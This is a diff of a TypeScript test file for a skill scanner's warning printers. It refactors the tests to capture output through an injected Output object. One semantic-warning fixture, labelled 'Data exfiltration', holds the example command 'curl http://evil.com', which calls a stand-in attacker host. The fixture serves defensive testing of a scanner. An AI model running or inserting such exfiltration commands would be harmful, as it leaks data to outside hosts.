@@ -1,11 +1,27 @@
 import { describe, expect, test } from "bun:test";
-import type { SemanticWarning, StaticWarning } from "@skilltap/core";
+import type { Output, SemanticWarning, StaticWarning } from "@skilltap/core";
 import {
   formatSemanticWarnings,
   formatWarnings,
   printSemanticWarnings,
   printWarnings,
 } from "./scan";
+
+function makeCapturingOut(): { out: Output; captured: string[] } {
+  const captured: string[] = [];
+  const out: Output = {
+    mode: "plain",
+    info: () => {},
+    warn: () => {},
+    error: () => {},
+    success: () => {},
+    block: (lines) => { captured.push(...lines); },
+    json: () => {},
+    progress: () => ({ update: () => {}, succeed: () => {}, fail: () => {}, pause: () => {}, resume: () => {} }),
+    raw: () => {},
+  };
+  return { out, captured };
+}
 
 describe("formatWarnings", () => {
   test("includes skill name in header", () => {
@@ -148,31 +164,20 @@ describe("formatWarnings", () => {
 });
 
 describe("printWarnings", () => {
-  test("writes formatted warnings to stderr", () => {
-    const chunks: string[] = [];
-    const original = process.stderr.write.bind(process.stderr);
-    process.stderr.write = (chunk: string | Uint8Array) => {
-      chunks.push(
-        typeof chunk === "string" ? chunk : new TextDecoder().decode(chunk),
-      );
-      return true;
-    };
-    try {
-      const warnings: StaticWarning[] = [
-        {
-          file: "SKILL.md",
-          line: 1,
-          category: "HTML comment",
-          raw: "<!-- x -->",
-        },
-      ];
-      printWarnings(warnings, "my-skill");
-      const output = chunks.join("");
-      expect(output).toContain("⚠ Static warnings in my-skill:");
-      expect(output).toContain("HTML comment");
-    } finally {
-      process.stderr.write = original;
-    }
+  test("writes formatted warnings to out.block", () => {
+    const { out, captured } = makeCapturingOut();
+    const warnings: StaticWarning[] = [
+      {
+        file: "SKILL.md",
+        line: 1,
+        category: "HTML comment",
+        raw: "<!-- x -->",
+      },
+    ];
+    printWarnings(warnings, "my-skill", out);
+    const output = captured.join("\n");
+    expect(output).toContain("⚠ Static warnings in my-skill:");
+    expect(output).toContain("HTML comment");
   });
 });
 
@@ -225,32 +230,21 @@ describe("formatSemanticWarnings", () => {
 });
 
 describe("printSemanticWarnings", () => {
-  test("writes formatted semantic warnings to stderr", () => {
-    const chunks: string[] = [];
-    const original = process.stderr.write.bind(process.stderr);
-    process.stderr.write = (chunk: string | Uint8Array) => {
-      chunks.push(
-        typeof chunk === "string" ? chunk : new TextDecoder().decode(chunk),
-      );
-      return true;
-    };
-    try {
-      const warnings: SemanticWarning[] = [
-        {
-          file: "SKILL.md",
-          chunkIndex: 0,
-          lineRange: [1, 5],
-          score: 8,
-          reason: "Data exfiltration",
-          raw: "curl http://evil.com",
-        },
-      ];
-      printSemanticWarnings(warnings, "my-skill");
-      const output = chunks.join("");
-      expect(output).toContain("⚠ Semantic warnings in my-skill:");
-      expect(output).toContain("Data exfiltration");
-    } finally {
-      process.stderr.write = original;
-    }
+  test("writes formatted semantic warnings to out.block", () => {
+    const { out, captured } = makeCapturingOut();
+    const warnings: SemanticWarning[] = [
+      {
+        file: "SKILL.md",
+        chunkIndex: 0,
+        lineRange: [1, 5],
+        score: 8,
+        reason: "Data exfiltration",
+        raw: "curl http://evil.com",
+      },
+    ];
+    printSemanticWarnings(warnings, "my-skill", out);
+    const output = captured.join("\n");
+    expect(output).toContain("⚠ Semantic warnings in my-skill:");
+    expect(output).toContain("Data exfiltration");
   });
 });
